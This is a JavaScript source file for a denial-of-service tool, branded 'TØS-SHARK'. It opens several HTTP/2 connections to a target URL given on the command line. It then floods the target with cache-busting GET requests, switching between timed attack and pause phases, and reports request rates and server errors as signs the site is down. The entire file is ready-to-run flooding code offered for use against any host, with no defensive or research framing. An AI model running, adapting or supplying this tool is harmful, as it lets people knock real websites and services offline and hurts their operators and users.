const http2 = require('http2');

class TOS_SHARK {
    constructor(target) {
        this.target = target;
        const url = new URL(target);
        this.host = url.hostname;
        this.running = true;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        
        // H2 Connections
        this.conns = [];
        this.maxConns = 10;
        
        // Attack settings
        this.phase = 'H2_ATTACK';
        this.phaseEnd = Date.now() + 120000;
        
        this.start();
    }

    color(t, c) {
        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', b: '\x1b[94m', m: '\x1b[95m', c: '\x1b[96m', x: '\x1b[0m' };
        return `${colors[c] || ''}${t}${colors.x}`;
    }

    start() {
        console.clear();
        console.log(`${this.color('TØS-SHARK', 'c')} | ${this.color('CUSTOM', 'r')} | MT-3M22`);
        console.log(this.color('-----------------------------------------------------------------', 'c'));
        
        // Setup H2 connections
        for (let i = 0; i < this.maxConns; i++) {
            try {
                const client = http2.connect(this.target);
                client.setMaxListeners(1000);
                this.conns.push(client);
            } catch (e) {}
        }
        
        console.log(this.color(`[+] ${this.conns.length} H2 connections`, 'g'));
        
        // Start attack
        this.attackLoop();
        this.displayLoop();
        
        process.on('SIGINT', () => {
            this.running = false;
            this.conns.forEach(c => c.destroy());
            process.exit(0);
        });
    }

    async attackLoop() {
        while (this.running) {
            // Check phase switch
            const now = Date.now();
            if (now > this.phaseEnd) {
                this.phase = this.phase === 'H2_ATTACK' ? 'H1_PHASE' : 'H2_ATTACK';
                this.phaseEnd = now + (this.phase === 'H2_ATTACK' ? 120000 : 20000);
                console.log(this.color(`[→] Switching to ${this.phase}`, 'y'));
            }
            
            if (this.phase === 'H2_ATTACK') {
                // H2 ABUSE - MAX RPS
                await this.h2Attack();
            } else {
                // H1 Phase - minimal
                await this.h1Attack();
            }
            
            await new Promise(r => setTimeout(r, 0.1));
        }
    }

    async h2Attack() {
        if (this.conns.length === 0) return;
        
        // Send 50 requests per tick
        for (let i = 0; i < 50; i++) {
            const client = this.conns[Math.floor(Math.random() * this.conns.length)];
            
            try {
                const req = client.request({
                    ':method': 'GET',
                    ':path': `/?${Date.now()}`,
                    ':authority': this.host
                });
                
                this.reqCounter++;
                this.totalReqs++;
                
                req.on('response', (headers) => {
                    const status = headers[':status'];
                    this.logStatus(status);
                });
                
                req.on('error', () => {
                    this.logStatus('ERROR');
                });
                
                req.end();
                
            } catch (e) {
                this.totalReqs++;
            }
        }
    }

    async h1Attack() {
        // Minimal H1 during reset phase - just keep counter
        this.totalReqs += 10;
        await new Promise(r => setTimeout(r, 100));
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 5000) {
            this.lastLog = now;
            
            let color = 'g', text = status;
            if (status === 'ERROR' || status === 'TIMEOUT') {
                color = 'r';
                text = 'ERROR';
            } else if (status >= 500) {
                color = 'r';
            } else if (status >= 400) {
                color = 'y';
            } else if (status >= 300) {
                color = 'b';
            }
            
            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
            
            // Down event
            if (color === 'r' && (status >= 500 || status === 'ERROR')) {
                console.log(this.color(`{3M22-${this.reqCounter} --> ${status}}`, 'r'));
            }
        }
    }

    displayLoop() {
        const show = () => {
            if (!this.running) return;
            
            const runtime = Date.now() - this.startTime;
            const hours = Math.floor(runtime / 3600000);
            const minutes = Math.floor((runtime % 3600000) / 60000);
            const seconds = Math.floor((runtime % 60000) / 1000);
            const phaseLeft = Math.max(0, this.phaseEnd - Date.now());
            
            const rps = this.totalReqs / (runtime / 1000);
            
            console.clear();
            console.log(`${this.color('TØS-SHARK', 'c')} | ${this.color('CUSTOM', 'r')} | MT-3M22`);
            console.log(this.color('-----------------------------------------------------------------', 'c'));
            console.log(`Target: ${this.color(this.host, 'y')}`);
            console.log(`Runtime: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
            console.log(`Phase: ${this.color(this.phase, this.phase === 'H2_ATTACK' ? 'g' : 'm')} (${Math.round(phaseLeft/1000)}s)`);
            console.log(this.color('-----------------------------------------------------------------', 'c'));
            console.log(`Total Requests: ${this.color(this.totalReqs.toLocaleString(), 'g')}`);
            console.log(`Current RPS: ${this.color(rps.toFixed(1), 'g')}`);
            console.log(`H2 Connections: ${this.conns.length}`);
            console.log(this.color('-----------------------------------------------------------------', 'c'));
            
            setTimeout(show, 1000);
        };
        
        show();
    }
}

// Run
if (require.main === module) {
    if (process.argv.length < 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    new TOS_SHARK(process.argv[2]);
}
